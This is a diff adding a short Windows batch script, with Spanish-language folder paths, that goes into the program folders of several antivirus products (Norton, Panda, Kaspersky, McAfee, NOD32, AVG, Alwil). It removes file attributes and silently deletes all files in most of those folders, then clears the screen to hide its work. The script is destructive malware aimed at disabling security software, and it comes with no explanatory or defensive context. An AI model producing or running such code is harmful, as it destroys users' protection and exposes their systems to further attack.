@@ -1,0 +1,31 @@
+@echo off
+cls
+cd \
+cd "archivos de programa"
+cd "Norton antivirus"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "Panda Software"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "Kaspersky Lab"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "McAfee.com"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "NOD32 Antivirus System"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd "AVG Free"
+attrib -R -A -S -H *.*
+cd..
+cd "alwil software"
+attrib -R -A -S -H *.*
+cd..
+cls
+
